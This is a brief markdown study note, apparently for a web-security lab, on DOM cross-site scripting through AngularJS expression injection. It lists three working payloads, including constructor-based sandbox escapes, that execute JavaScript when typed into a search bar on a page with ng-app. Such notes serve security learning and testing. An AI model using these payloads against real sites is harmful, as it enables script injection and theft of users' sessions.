![image1](Image/xss.png)

## DOM XSS in AngularJS expression

- __When HTML contains ng-app attribute__
  - __you can execute arbitrary JavaScript code__
  - __To get the payloads go to book.hacktricks.xyz__
  - __use any payload in the search bar__

  - __`{{$on.constructor ('alert(1)') ()}}`__
  - __`{{constructor.constructor ('alert(1)')()}}`__
  - __`<input ng-focus=$event.view.alert('XSS')>`__
